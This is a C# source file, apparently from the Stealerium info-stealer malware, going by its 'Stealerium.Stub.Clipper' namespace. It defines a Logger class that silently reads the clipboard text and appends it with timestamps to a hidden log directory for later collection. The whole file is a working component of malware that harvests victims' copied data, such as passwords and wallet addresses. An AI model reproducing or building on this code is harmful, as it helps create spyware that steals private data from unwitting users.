using System;
using System.IO;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Clipper
{
    /// <summary>
    /// The Logger class is responsible for saving clipboard data to log files.
    /// </summary>
    internal sealed class Logger
    {
        // Directory where clipboard logs will be stored, generated based on the current date.
        private static readonly string LogDirectory = Path.Combine(
            Paths.InitWorkDir(),
            "logs", "clipboard", DateTime.Now.ToString("yyyy-MM-dd"));

        /// <summary>
        /// Saves the current clipboard content to a log file.
        /// </summary>
        public static void SaveClipboard()
        {
            // Retrieve the clipboard text content.
            var clipboardContent = Clipboard.GetText();

            // If the clipboard content is null, empty, or whitespace, exit the method.
            if (string.IsNullOrWhiteSpace(clipboardContent))
            {
                return;
            }

            // Define the log file path, appending clipboard_logs.txt to the log directory.
            var logFilePath = Path.Combine(LogDirectory, "clipboard_logs.txt");

            try
            {
                // Ensure the log directory exists; create it if it doesn't.
                if (!Directory.Exists(LogDirectory))
                {
                    Directory.CreateDirectory(LogDirectory);
                }

                // Append the current clipboard content to the log file with a timestamp.
                File.AppendAllText(logFilePath,
                    $"### {DateTime.Now:yyyy-MM-dd h:mm:ss tt} ###\n{clipboardContent}\n\n");
            }
            catch (Exception ex)
            {
                // Optional: Log or handle the error if file writing fails.
                Logging.Log($"Failed to save clipboard content: {ex.Message}", false);
            }
        }
    }
}
